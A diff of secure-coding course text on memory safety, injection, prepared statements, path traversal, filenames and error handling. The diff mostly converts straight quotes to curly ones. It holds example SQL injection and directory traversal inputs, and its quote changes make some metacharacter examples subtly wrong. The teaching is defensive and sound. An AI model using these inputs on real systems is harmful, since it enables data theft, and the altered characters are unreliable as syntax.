+If you are writing code that is not memory-safe, or calling code that is not memory-safe, make sure hardening measures like these are enabled whenever you can, including in compilation, test, and production. The good news is that hardening measures like these will slow down some exploits. But in the end, hardening measures often do not *prevent* exploits. In the best case, these hardening measures turn “take over program” into “program stops working”... and that is the *best* case. The only way to not have vulnerable code… is to not have vulnerable code.
 
 ### Quiz 2.4
 
@@ -2050,7 +2050,7 @@ Out-of-bounds reads and writes are not the only problem for programs written in 
 
 When processing information you typically need to allocate memory (e.g., with **new**) and use it for a while. Most programming languages automatically track when you don’t need to use memory any more and reclaim it; this process is called *automatic garbage collection* or *automated memory management* (we will use the latter term). There are different ways to do automated memory management (the most typical are reference counting or tracing), and terminology varies, but the point is that in most programming languages this is automatically handled for you.
 
-But in some programming languages you must *manually* release memory when you are done with it. In particular, this is true for C (**free**) and C++ (**delete**). If you forget to release the memory when you are done using it, this leads to a "memory leak"; the program will increasingly use more memory. In some situations this increasing memory use can lead to a crash, which by definition is a loss of availability. But in security the bigger issue is usually freeing the memory region *more* than once; this is called a *double free*. Another big security problem is *use-after-free*, that is, using the memory after it has been freed. In memory-safe languages a double-free or use-after-free won’t happen. However, a double-free or use-after-free in a C or C++ program often corrupts low-level infrastructure and can change the value of program values that *appear* to be unrelated.
+But in some programming languages you must *manually* release memory when you are done with it. In particular, this is true for C (**free**) and C++ (**delete**). If you forget to release the memory when you are done using it, this leads to a “memory leak"; the program will increasingly use more memory. In some situations this increasing memory use can lead to a crash, which by definition is a loss of availability. But in security the bigger issue is usually freeing the memory region *more* than once; this is called a *double free*. Another big security problem is *use-after-free*, that is, using the memory after it has been freed. In memory-safe languages a double-free or use-after-free won’t happen. However, a double-free or use-after-free in a C or C++ program often corrupts low-level infrastructure and can change the value of program values that *appear* to be unrelated.
 
 If an attacker can cause your program to double-free or use-after-free, this can result in a serious vulnerability where the attacker can cause the program to do anything. That is because these mistakes often allow an attacker to corrupt and control the infrastructure your program runs on.
 
@@ -2080,15 +2080,15 @@ No, it is not safe to use a memory region after freeing it, no matter what. It *
 
 Many programming languages are defined in some sort of formal specification. When that is the case, where practical, you should try to write code that conforms to those specifications, because your code is more likely to work in all cases, and as the language implementations change, your code is more likely to keep working.
 
-Sometimes these specifications will permit one of several different options (this is sometimes called "unspecified behavior" or “compiler-specific behavior”). You should normally try to write your code so that it does not matter which permitted option is used, it will just keep working. Languages that support threading allow the threads to execute in parallel and in arbitrary order. In many languages, the order of operations in a call such as **f(aa, bb, cc)** is not defined (that is, it does not guarantee that **aa** or **cc** is computed first). Beware of depending on what your tools currently do, because when the tools are upgraded what they do may change. For many developers, dealing with this is already second nature.
+Sometimes these specifications will permit one of several different options (this is sometimes called “unspecified behavior” or “compiler-specific behavior”). You should normally try to write your code so that it does not matter which permitted option is used, it will just keep working. Languages that support threading allow the threads to execute in parallel and in arbitrary order. In many languages, the order of operations in a call such as **f(aa, bb, cc)** is not defined (that is, it does not guarantee that **aa** or **cc** is computed first). Beware of depending on what your tools currently do, because when the tools are upgraded what they do may change. For many developers, dealing with this is already second nature.
 
-However, some languages (such as C and C++) have constructs with truly *undefined behavior*. That is, if you take certain actions, the specification guarantees *absolutely nothing*. For example, the [C FAQ](http://c-faq.com/ansi/undef.html) notes that with undefined behavior, *"Anything at all can happen; the Standard imposes no requirements. The program may fail to compile, or it may execute incorrectly (either crashing or silently generating incorrect results), or it may fortuitously do exactly what the programmer intended."* 
+However, some languages (such as C and C++) have constructs with truly *undefined behavior*. That is, if you take certain actions, the specification guarantees *absolutely nothing*. For example, the [C FAQ](http://c-faq.com/ansi/undef.html) notes that with undefined behavior, *“Anything at all can happen; the Standard imposes no requirements. The program may fail to compile, or it may execute incorrectly (either crashing or silently generating incorrect results), or it may fortuitously do exactly what the programmer intended.”* 
 
 Any undefined behavior can be - and often is - a security vulnerability. Even if it just happens to not be a security vulnerability today, a minor upgrade in your tools, operating system, or configuration might turn it into a vulnerability.
 
 Many languages have at least some undefined behaviors, and so, if you use those languages, you need to learn what they are and avoid them. C and C++ have an especially large number of undefined behaviors. For example, for C, there are hundreds of undefined behaviors; the list is 11 pages long in the publicly available final draft of [C18 annex J.2](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf). It is also very easy in C and C++ to accidentally write code that has undefined behavior.  We have already seen some examples of undefined behavior: reads and writes out of the bounds of a buffer, use-after-free, and double-frees. Here are a few more.
 
-In C and C++, a null pointer dereference is also undefined (e.g., evaluating "**&#42;p**" when **p** is **NULL**). This means that an attempt to dereference a null pointer does not necessarily lead to trying to read an invalid value, the program might do *anything* at all.
+In C and C++, a null pointer dereference is also undefined (e.g., evaluating “**&#42;p**” when **p** is **NULL**). This means that an attempt to dereference a null pointer does not necessarily lead to trying to read an invalid value, the program might do *anything* at all.
 
 🔔 *Null Pointer Dereference* ([CWE-476](https://cwe.mitre.org/data/definitions/476.html)) is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #14. 
 
@@ -2138,7 +2138,7 @@ Learning objectives:
 
 ### Introduction to Securely Calling Programs
 
-Very few programs are entirely self-contained; nearly all programs call out to other programs. This includes local programs, such as programs provided by the operating system, built-in software libraries for that language, and software from package repositories (like npm, PyPI, and maven). Modern systems often call out through a network to other services, making requests through various APIs (such as REST and GraphQL APIs) and receiving data in formats such as JSON and XML. Almost all of these programs then call other programs. Often, these indirect calls are not obvious (e.g., calling a library written by someone else) or involve a great deal of "hidden" infrastructure.
+Very few programs are entirely self-contained; nearly all programs call out to other programs. This includes local programs, such as programs provided by the operating system, built-in software libraries for that language, and software from package repositories (like npm, PyPI, and maven). Modern systems often call out through a network to other services, making requests through various APIs (such as REST and GraphQL APIs) and receiving data in formats such as JSON and XML. Almost all of these programs then call other programs. Often, these indirect calls are not obvious (e.g., calling a library written by someone else) or involve a great deal of “hidden” infrastructure.
 
 You need to be careful about what programs you choose to use (trust) and manage them (e.g., how you record and update them). Once you choose them, you must be careful about how you use these other programs. In this section, we are going to talk about securely *using* other programs.
 
@@ -2160,9 +2160,9 @@ A very important principle is that if a routine is hard to use securely, and the
 
 You *can* use such routines securely, and sometimes you need to. But if you can avoid it, your program will probably be more secure - and it will probably be easier to maintain, too. If you cannot avoid them, you may want to wrap their use in special wrappers to make them easier to use safely.
 
-Why are certain kinds of routines hard to use securely? One common problem is that many routines accept languages with *metacharacters* - that is, characters that change how other characters are interpreted instead of being data themselves. For example, the double quote character (**"**) is often a metacharacter (including in SQL and shell). If there is a language specification, that almost certainly means there are metacharacters. Supporting metacharacters is very flexible, and if all of the input is trusted, it is not a problem. But when parts of the data might be from an attacker, you need to be very careful and take extra precautions. If an attacker can insert metacharacters into the input, and they are not escaped exactly correctly, then dangerous and easily-exploited vulnerabilities often follow if they are read by some kind of interpreter. These kinds of attacks are sometimes called injection attacks.
+Why are certain kinds of routines hard to use securely? One common problem is that many routines accept languages with *metacharacters* - that is, characters that change how other characters are interpreted instead of being data themselves. For example, the double quote character (**“**) is often a metacharacter (including in SQL and shell). If there is a language specification, that almost certainly means there are metacharacters. Supporting metacharacters is very flexible, and if all of the input is trusted, it is not a problem. But when parts of the data might be from an attacker, you need to be very careful and take extra precautions. If an attacker can insert metacharacters into the input, and they are not escaped exactly correctly, then dangerous and easily-exploited vulnerabilities often follow if they are read by some kind of interpreter. These kinds of attacks are sometimes called injection attacks.
 
-🔔 Vulnerabilities to injection attacks are such common mistakes in web applications that "Injection" is 2017 OWASP Top 10 #1 and 2019 CWE Top 25 #18. It is identified as [CWE-94](https://cwe.mitre.org/data/definitions/94.html),  *Improper Control of Generation of Code ('Code Injection')*.
+🔔 Vulnerabilities to injection attacks are such common mistakes in web applications that “Injection” is 2017 OWASP Top 10 #1 and 2019 CWE Top 25 #18. It is identified as [CWE-94](https://cwe.mitre.org/data/definitions/94.html),  *Improper Control of Generation of Code (‘Code Injection’)*.
 
 So you need to ensure that when you send data to some program (or output), you send it in a secure way. That may involve:
 
@@ -2211,13 +2211,13 @@ Here is a trivial example; here is a snippet of Java that tries to do an SQL que
     rs = statement.executeQuery(QueryString);
 ~~~~
 
-The intent is clear; if **search_lastname** has the value **Fred**, then the database will receive the query "**select * from authors where lastname='Fred';**" - a reasonable SQL query. But remember our warning signs - this code concatenates strings, some of that data is probably provided by an attacker, and we’re doing something called “execute”.  The warning signs are right. Imagine that the attacker provides the input “**Fred’ OR ’a’=’a**”. This will produce the query “**select * from authors where lastname='Fred' OR ’a’=’a’;**” and now the attacker can retrieve the entire database. The attacker could even modify or delete data this way, depending on various factors. This is a simple example of an SQL injection attack; an attacker can insert some characters and inject new or modified commands.
+The intent is clear; if **search_lastname** has the value **Fred**, then the database will receive the query “**select * from authors where lastname='Fred';**” - a reasonable SQL query. But remember our warning signs - this code concatenates strings, some of that data is probably provided by an attacker, and we’re doing something called “execute”.  The warning signs are right. Imagine that the attacker provides the input “**Fred’ OR ’a’=’a**”. This will produce the query “**select * from authors where lastname='Fred' OR ’a’=’a’;**” and now the attacker can retrieve the entire database. The attacker could even modify or delete data this way, depending on various factors. This is a simple example of an SQL injection attack; an attacker can insert some characters and inject new or modified commands.
 
-There are many ways to trigger SQL injection attacks; attackers can insert single quotes (used to surround constant character data), semicolons (which act as command separators), "**--**" which is a comment token, and so on. This is not a complete list; different database systems interpret different characters differently. For example, double quotes are often metacharacters, but with different meanings. Even different versions of the *same* database system, or different configurations, can cause changes to how the characters are interpreted. We already know we should not create a list of "bad" characters, because that is a denylist. We could create an allowlist of characters we know are not metacharacters and then escape the rest, but this process is hard to do correctly for SQL.
+There are many ways to trigger SQL injection attacks; attackers can insert single quotes (used to surround constant character data), semicolons (which act as command separators), “**--**” which is a comment token, and so on. This is not a complete list; different database systems interpret different characters differently. For example, double quotes are often metacharacters, but with different meanings. Even different versions of the *same* database system, or different configurations, can cause changes to how the characters are interpreted. We already know we should not create a list of “bad” characters, because that is a denylist. We could create an allowlist of characters we know are not metacharacters and then escape the rest, but this process is hard to do correctly for SQL.
 
 If you are using a database, you shouldn’t ever be concatenating strings to create a query, because that is easy to get wrong. Remember, we want to try to use a routine that is easy to use correctly.
 
-🔔 SQL injection is a special case of injection attacks, and we have already noted that injection attacks are so common and dangerous that they are 2017 OWASP Top 10 #1. SQL injection specifically is such a common cause of security vulnerabilities that just SQL injection is 2019 CWE Top 25 #6. SQL injection is also identified as [CWE-89](https://cwe.mitre.org/data/definitions/89.html), *Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')*. 
+🔔 SQL injection is a special case of injection attacks, and we have already noted that injection attacks are so common and dangerous that they are 2017 OWASP Top 10 #1. SQL injection specifically is such a common cause of security vulnerabilities that just SQL injection is 2019 CWE Top 25 #6. SQL injection is also identified as [CWE-89](https://cwe.mitre.org/data/definitions/89.html), *Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)*. 
 
 For databases, there are well-known solutions that are far easier to use securely.
 
@@ -2227,7 +2227,7 @@ SQL injection vulnerabilities are one of the most common and devastating vulnera
 
 *Prepared statements* are perhaps the best way to counter SQL injection attacks if you are directly creating SQL commands that need to be secure. Most programming languages have at least one library that implements prepared statements.
 
-Prepared statements allow you to identify placeholders (often a "**?**") for data that needs to be escaped. A pre-existing library that you call then escapes the data properly for that specific implementation. This approach has many advantages:
+Prepared statements allow you to identify placeholders (often a “**?**”) for data that needs to be escaped. A pre-existing library that you call then escapes the data properly for that specific implementation. This approach has many advantages:
 
 1. Since the library does the escaping for you, it is simpler to use and more likely to be right.
 
@@ -2244,7 +2244,7 @@ Here is an example of using prepared statements in Java:
     ResultSet results = pstmt.execute( );
 ~~~~
 
-There are more statements, but the statements are simpler; in particular, the complicated concatenation is now a simple string constant. We still call something called "**execute**" - but remember, avoiding methods named “execute” is just a rule of thumb to help us detect potential problems.
+There are more statements, but the statements are simpler; in particular, the complicated concatenation is now a simple string constant. We still call something called “**execute**” - but remember, avoiding methods named “execute” is just a rule of thumb to help us detect potential problems.
 
 Of course, like any technique, if you use it wrongly then it won’t be secure. Here is an example of how to use prepared statements in Java to produce a probably-insecure program:
 
@@ -2254,7 +2254,7 @@ Of course, like any technique, if you use it wrongly then it won’t be secure. 
     ResultSet results = pstmt.execute( ); // Probably insecure, don’t do this!
 ~~~~
 
-This insecure program uses a prepared statement, but instead of correctly using "**?**" as a value placeholder (which will then be properly escaped), this code directly concatenates data into the query. Unless the data is properly escaped (and it almost certainly isn’t), this code can quickly lead to a serious vulnerability if this data can be controlled by an attacker.
+This insecure program uses a prepared statement, but instead of correctly using “**?**” as a value placeholder (which will then be properly escaped), this code directly concatenates data into the query. Unless the data is properly escaped (and it almost certainly isn’t), this code can quickly lead to a serious vulnerability if this data can be controlled by an attacker.
 
 Many programs use object-relational mapping (ORM). This is just a technique to automatically convert data in a relational database into an object in an object-oriented programming language and back; lots of libraries and frameworks will do this for you. This is fine, as long as the ORM is implemented using prepared statements or something equivalent to them. In practice, any good ORM implementation will do so. So if you are using a respected ORM, you are already doing this. That said, it is common in systems that use ORMs to occasionally need to use SQL queries directly… and when you do, use prepared statements.
 
@@ -2288,11 +2288,11 @@ If all you want to do is call another program and pass it some parameters, try t
 
 In short: if you see code that concatenates strings for execution by a shell, and that concatenation includes untrusted input, be extremely concerned. While it is possible to do this securely, it is better avoided when you reasonably can.
 
-If you must call a program through a shell, and also include some data that might be provided by an attacker, you need to use it securely. That is actually rather tricky. As always, *do not use a denylist*. There are many "lists of shell metacharacters" that are wrong because they miss some. So if you are sending data through a shell, you need to escape every character except for ones on an allowlist (characters you know are *not* metacharacters). Generally, A-Z, a-z, and 0-9 are not metacharacters, and after that, check very carefully. Make sure you quote everything as needed.
+If you must call a program through a shell, and also include some data that might be provided by an attacker, you need to use it securely. That is actually rather tricky. As always, *do not use a denylist*. There are many “lists of shell metacharacters” that are wrong because they miss some. So if you are sending data through a shell, you need to escape every character except for ones on an allowlist (characters you know are *not* metacharacters). Generally, A-Z, a-z, and 0-9 are not metacharacters, and after that, check very carefully. Make sure you quote everything as needed.
 
-Of course, if you are calling a program with any data that might be from an attacker, you need to make sure that the data will not be misinterpreted. For example, make sure your command-line options will be correctly interpreted; if an attacker can cause the initial character to be "**-**" or “**/**” in a parameter, then they might be misinterpreted as an option or root directory. Anything passed in (e.g., by parameter or anything else) must be carefully escaped to prevent attack. This brings us to the topic of filenames, which we will cover next.
+Of course, if you are calling a program with any data that might be from an attacker, you need to make sure that the data will not be misinterpreted. For example, make sure your command-line options will be correctly interpreted; if an attacker can cause the initial character to be “**-**” or “**/**” in a parameter, then they might be misinterpreted as an option or root directory. Anything passed in (e.g., by parameter or anything else) must be carefully escaped to prevent attack. This brings us to the topic of filenames, which we will cover next.
 
-🔔 OS command injection is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #11. It is [CWE-78](https://cwe.mitre.org/data/definitions/78.html), *Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*.
+🔔 OS command injection is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #11. It is [CWE-78](https://cwe.mitre.org/data/definitions/78.html), *Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)*.
 
 ### Quiz 3.3
 
@@ -2310,7 +2310,7 @@ This is true. Not only is it more efficient, but the operating system shell usua
 
 ### Filenames (Including Path Traversal)
 
-Technically, a "**pathname**" is a sequence of bytes that describes how to find a filesystem object. On Unix-like systems, including Linux, Android, MacOS, and iOS, a pathname is a sequence of one or more filenames separated by one or more "**/**". On Windows systems, a pathname is more complicated but the idea is the same. In practice, many people use the term "filename" to refer to pathnames.
+Technically, a “**pathname**” is a sequence of bytes that describes how to find a filesystem object. On Unix-like systems, including Linux, Android, MacOS, and iOS, a pathname is a sequence of one or more filenames separated by one or more “**/**”. On Windows systems, a pathname is more complicated but the idea is the same. In practice, many people use the term “filename” to refer to pathnames.
 
 Pathnames are often at least partly controlled by an untrusted user. For example, it is often useful to use filenames as a key to identify relevant data, but this can lead to untrusted users controlling filenames. Another example is when monitoring or managing shared systems (e.g., virtual machines or containerized filesystems); in this case, an untrusted monitoree controls filenames. Even when an attacker should not be able to gain this kind of control, it is often important to counter this kind of problem as a defense-in-depth measure, to counter attackers who gain a small amount of control.
 
@@ -2318,27 +2318,27 @@ Pathnames are often at least partly controlled by an untrusted user. For example
 
 #### Path Traversal
 
-An obvious case is that systems are often not supposed to allow access outside of some directory (e.g., a "document root" of a web server). For example, if a program tries to access a path that is a concatenation of "**trusted_root_path**" and "**username**", the attacker might be able to create a username ".**./../../mysecrets**" and foil the limitations. This vulnerability, where an attacker can create filenames that traverse outside where it is supposed to, is so common that it has a name: *directory traversal vulnerabilities*. As always, use a very limited allowlist for information that will be used to create filenames. If your web application’s allowlist does not include "**.**", "**/**", "**~**", and "**&#92;**", on most systems it is significantly harder to traverse outside the intended directory root. Another common solution is to convert a relative path into a normalized absolute path in a way that eliminates all "**..**" uses and then ensure that the resulting path is still in the correct region of the filesystem.
+An obvious case is that systems are often not supposed to allow access outside of some directory (e.g., a “document root” of a web server). For example, if a program tries to access a path that is a concatenation of “**trusted_root_path**” and “**username**”, the attacker might be able to create a username “.**./../../mysecrets**” and foil the limitations. This vulnerability, where an attacker can create filenames that traverse outside where it is supposed to, is so common that it has a name: *directory traversal vulnerabilities*. As always, use a very limited allowlist for information that will be used to create filenames. If your web application’s allowlist does not include “**.**”, “**/**”, “**~**”, and “**&#92;**”, on most systems it is significantly harder to traverse outside the intended directory root. Another common solution is to convert a relative path into a normalized absolute path in a way that eliminates all “**..**” uses and then ensure that the resulting path is still in the correct region of the filesystem.
 
 > 😱 STORY TIME: SaltStack
 
-> An example of a directory traversal vulnerability is [CVE-2020-11652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11652), a vulnerability in the SaltStack. SaltStack is a configuration management and orchestration tool for managing multi-computer infrastructure. In this vulnerability, a method failed to properly sanitize an input parameter, allowing "**..**" elements that were used to create a filename. The result was that attackers could cause entire sets of machines to execute commands of their choosing.
+> An example of a directory traversal vulnerability is [CVE-2020-11652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11652), a vulnerability in the SaltStack. SaltStack is a configuration management and orchestration tool for managing multi-computer infrastructure. In this vulnerability, a method failed to properly sanitize an input parameter, allowing “**..**” elements that were used to create a filename. The result was that attackers could cause entire sets of machines to execute commands of their choosing.
 
-🔔 Path traversal is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #10. It is also identified as [CWE-22](https://cwe.mitre.org/data/definitions/22.html), *Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')*.
+🔔 Path traversal is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #10. It is also identified as [CWE-22](https://cwe.mitre.org/data/definitions/22.html), *Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)*.
 
 #### Windows Pathnames
 
-Microsoft Windows pathnames can be extremely difficult to deal with securely. Windows pathname interpretations vary depending on the version of Windows and the API used (many calls use **CreateFile** which supports the pathname prefix "**\\.&#92;**" - and these interpret pathnames differently than the other calls that do not). Perhaps most obviously, "**letter:**" and "**\\server\share...**" have a special meaning in Windows. A nastier issue is that there are reserved filenames, whose form depends on the API used and the local configuration. The built-in reserved device names are as follows: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9. Even worse, drivers can create more reserved names - so you actually cannot know ahead-of-time what names are reserved. You should avoid creating filenames with reserved names, both with and without an extension; if an attacker can trick the program into reading/writing the name (e.g., **com1.txt**), it may (depending on API) cause read or write to a device instead of a file. In this case, even simple alphanumerics can cause disaster and be interpreted as metacharacters - this is rare, since usually alphanumerics are safe. Windows supports "**/**" as a directory separator, but it conventionally uses "**&#92;**" as the directory separator (which is annoying because **&#92;** is widely used as an escape character). In Windows, don’t end a file or directory name with a space or period; the underlying filesystem may support it, but the Windows shell and user interface generally do not. For more details, check the Microsoft Windows documentation on [*Naming Files, Paths, and Namespaces*](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN).
+Microsoft Windows pathnames can be extremely difficult to deal with securely. Windows pathname interpretations vary depending on the version of Windows and the API used (many calls use **CreateFile** which supports the pathname prefix “**\\.&#92;**” - and these interpret pathnames differently than the other calls that do not). Perhaps most obviously, “**letter:**” and “**\\server\share...**” have a special meaning in Windows. A nastier issue is that there are reserved filenames, whose form depends on the API used and the local configuration. The built-in reserved device names are as follows: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9. Even worse, drivers can create more reserved names - so you actually cannot know ahead-of-time what names are reserved. You should avoid creating filenames with reserved names, both with and without an extension; if an attacker can trick the program into reading/writing the name (e.g., **com1.txt**), it may (depending on API) cause read or write to a device instead of a file. In this case, even simple alphanumerics can cause disaster and be interpreted as metacharacters - this is rare, since usually alphanumerics are safe. Windows supports “**/**” as a directory separator, but it conventionally uses “**&#92;**” as the directory separator (which is annoying because **&#92;** is widely used as an escape character). In Windows, don’t end a file or directory name with a space or period; the underlying filesystem may support it, but the Windows shell and user interface generally do not. For more details, check the Microsoft Windows documentation on [*Naming Files, Paths, and Namespaces*](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN).
 
 #### Unix/Linux Pathnames
 
 Filenames and pathnames on Unix-like systems are not always easy to deal with either. On most Unix-like systems, a filename can be any sequence of bytes that does not include **\0** (the terminator) or slash. One common misconception is that Unix filenames are a string of characters. Unix filenames are not a string of one or more characters; they are merely a sequence of bytes, so a filename does not need to be a legal sequence of characters. For example, while it is a common convention to interpret filenames as a UTF-8 encoding of characters, most systems do not actually enforce this. Indeed, they tend to enforce nothing, so many problematic filenames can be created, including filenames with spaces (or only spaces), control characters (including newline, tab, escape, etc.), bytes that are not legal UTF-8, or
 
-including a leading "**-**" (the marker for command options). These problematic filenames can cause trouble later.
+including a leading “**-**” (the marker for command options). These problematic filenames can cause trouble later.
 
-Some potential problems with filenames are specific to the shell, but filename problems are not limited to the shell. A common problem is that "**-**" is the option flag for many commands, but it is a legal beginning of a filename.
+Some potential problems with filenames are specific to the shell, but filename problems are not limited to the shell. A common problem is that “**-**” is the option flag for many commands, but it is a legal beginning of a filename.
 
-A simple solution is to prefix all globs or filenames where needed with "**./**" so that they cannot begin with "**-**". So for example, never use "**&#42;.pdf**" to refer to a set of PDFs if an attacker might influence a directory’s filenames; use "**./&#42;.pdf**".
+A simple solution is to prefix all globs or filenames where needed with “**./**” so that they cannot begin with “**-**”. So for example, never use “**&#42;.pdf**” to refer to a set of PDFs if an attacker might influence a directory’s filenames; use “**./&#42;.pdf**”.
 
 Be careful about displaying or storing pathnames, since they can include newlines, tabs, escape (which can begin terminal controls), or sequences that are not legal strings. On some systems, merely displaying filenames can invoke terminal controls, which can then run commands with the privilege of the one displaying.
 
@@ -2350,9 +2350,9 @@ Be careful about displaying or storing pathnames, since they can include newline
 
 [x] On Unix and Linux, filenames may contain control characters.
 
-[x] On Unix and Linux, filenames with leading "**-**" characters can be a security problem. A simple solution is to prefix globs with “**./**” so that the first character cannot be a “**-**”.
+[x] On Unix and Linux, filenames with leading “**-**” characters can be a security problem. A simple solution is to prefix globs with “**./**” so that the first character cannot be a “**-**”.
 
-[x] Path traversal occurs when an attacker can create filenames that traverse outside where they are supposed to, e.g., by embedding "**/../**". A good way to counter this is to use a limited allowlist that prevents these attacks.
+[x] Path traversal occurs when an attacker can create filenames that traverse outside where they are supposed to, e.g., by embedding “**/../**”. A good way to counter this is to use a limited allowlist that prevents these attacks.
 
 ## Calling Other Programs: Other Issues
 
@@ -2360,7 +2360,7 @@ Be careful about displaying or storing pathnames, since they can include newline
 
 When writing programs, try to call only application programming interfaces (APIs) that are intended for use by programs.
 
-Usually a program can invoke any other program, including those that are really designed only for human interaction. However, it is usually unwise to invoke a program intended for human interaction in the same way a human would. The problem is that programs’ human interfaces are intentionally rich in functionality and are often difficult to completely control. For example, interactive programs often have "escape" codes, which might enable an attacker to perform undesirable functions. Also, interactive programs often try to intuit the “most likely” defaults; this may not be the default you were expecting, and an attacker may find a way to exploit this.
+Usually a program can invoke any other program, including those that are really designed only for human interaction. However, it is usually unwise to invoke a program intended for human interaction in the same way a human would. The problem is that programs’ human interfaces are intentionally rich in functionality and are often difficult to completely control. For example, interactive programs often have “escape” codes, which might enable an attacker to perform undesirable functions. Also, interactive programs often try to intuit the “most likely” defaults; this may not be the default you were expecting, and an attacker may find a way to exploit this.
 
 Usually there are parameters to give you safer access to the program’s functionality, or a different API or application that is intended for use by programs; use those instead.
 
@@ -2390,7 +2390,7 @@ Poor error handling can lead to security vulnerabilities. So let’s discuss com
 
 > 😱 STORY TIME: Apple **goto fail; goto fail;**
 
-> An example of a security vulnerability caused by bad error handling is [CVE-2014-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266), commonly called the "*goto fail; goto fail;*" vulnerability. This was a vulnerability in the Apple implementation of the SSL/TLS protocol in many versions of its operating systems. The problem was a second (duplicate) “**goto fail;**” statement in the function **SSLVerifySignedServerKeyExchange**, as follows:
+> An example of a security vulnerability caused by bad error handling is [CVE-2014-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266), commonly called the “*goto fail; goto fail;*” vulnerability. This was a vulnerability in the Apple implementation of the SSL/TLS protocol in many versions of its operating systems. The problem was a second (duplicate) “**goto fail;**” statement in the function **SSLVerifySignedServerKeyExchange**, as follows:
 
 ~~~~C
     if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
@@ -2402,11 +2402,11 @@ Poor error handling can lead to security vulnerabilities. So let’s discuss com
       return err;
 ~~~~
 
-> The indentation here is misleading; since there are no curly braces after the **if** statement, the second "**goto fail**" is always executed. In context, that meant that vital signature checking code was skipped, so both bad and good signatures would be accepted. The extraneous “**goto**” caused the function to return 0 (“no error”) when the rest of the checking was skipped; as a result, invalid certificates were quietly accepted as valid. This was a disastrous vulnerability, since it meant that all sorts of invalid certificates would be accepted, completely compromising security. This vulnerability would be easily detected by an automated test suite. ([*The Apple goto fail vulnerability: lessons learned*](https://dwheeler.com/essays/apple-goto-fail.html), by David A. Wheeler, 2020).
+> The indentation here is misleading; since there are no curly braces after the **if** statement, the second “**goto fail**” is always executed. In context, that meant that vital signature checking code was skipped, so both bad and good signatures would be accepted. The extraneous “**goto**” caused the function to return 0 (“no error”) when the rest of the checking was skipped; as a result, invalid certificates were quietly accepted as valid. This was a disastrous vulnerability, since it meant that all sorts of invalid certificates would be accepted, completely compromising security. This vulnerability would be easily detected by an automated test suite. ([*The Apple goto fail vulnerability: lessons learned*](https://dwheeler.com/essays/apple-goto-fail.html), by David A. Wheeler, 2020).
 
 #### Return Codes
 
-One of the most common error-handling mechanisms are return codes. A return code is simply a single value that is *either* the return value of a method/function/procedure or a value that indicates an error. For example, "on success returns 0..INT_MAX, on error returns -1" or “on success returns a pointer, on error returns NULL”. In some cases, nothing is being returned (at least as its return value), so the return value is simply whether or not there was an error. Return codes are the usual approach in C, but return codes are used in many programming languages.
+One of the most common error-handling mechanisms are return codes. A return code is simply a single value that is *either* the return value of a method/function/procedure or a value that indicates an error. For example, “on success returns 0..INT_MAX, on error returns -1” or “on success returns a pointer, on error returns NULL”. In some cases, nothing is being returned (at least as its return value), so the return value is simply whether or not there was an error. Return codes are the usual approach in C, but return codes are used in many programming languages.
 
 Obviously, when you are developing a program, you need to ensure that the return code is not a legitimate value, so that errors and normal values *can* be distinguished.
 
@@ -2414,7 +2414,7 @@ Return codes work, but they have many problems when maintaining software over ti
 
 * They require the caller to check every return value for an error to handle it. These are easy to forget, and thus this is a common mistake.
 
-* Every method may have different semantics (e.g., different values to indicate "error"). They are often **0**, **negative**, **INT_MAX**, **NULL**, or some other special value… but not always.
+* Every method may have different semantics (e.g., different values to indicate “error”). They are often **0**, **negative**, **INT_MAX**, **NULL**, or some other special value… but not always.
 
 * If new types of errors are added, you must often check every caller to ensure they are handled correctly.
 
@@ -2424,9 +2424,9 @@ In most programming languages it is often better to use another mechanism (like 
 
 #### Exceptions
 
-Most programming languages have an *exception handling mechanism* (though there are, er, exceptions!). This includes such diverse languages as Java, C#, Python, PHP (5+), Perl, Ruby, Tcl, JavaScript, C++, Ada, Smalltalk, Common Lisp, Scheme (6+), Erlang, and OCaml. In such systems, you can "throw" or “raise” an exception when an error is detected, and you can “catch” or “rescue” an exception to handle it; the stack is repeatedly unwound when an exception is thrown until there is a matching catch. Many languages define regions to catch (e.g., “try”).
+Most programming languages have an *exception handling mechanism* (though there are, er, exceptions!). This includes such diverse languages as Java, C#, Python, PHP (5+), Perl, Ruby, Tcl, JavaScript, C++, Ada, Smalltalk, Common Lisp, Scheme (6+), Erlang, and OCaml. In such systems, you can “throw” or “raise” an exception when an error is detected, and you can “catch” or “rescue” an exception to handle it; the stack is repeatedly unwound when an exception is thrown until there is a matching catch. Many languages define regions to catch (e.g., “try”).
 
-If you are implementing the *top* level of a program or framework (e.g., its main event loop), you typically want to catch all exceptions (with perhaps a few, er, exceptions). Log the exception (with some details, except information like passwords that perhaps should be omitted from the log). Ensure that after the request or event has completed, including when an exception has been processed, that all resources have been returned if they should be. Finally, repeat the event loop to process the next event. Logging can aid debugging and intrusion detection. It is fine to tell the requestor that "there was a problem" while not providing many details; that is what the internal log is for.
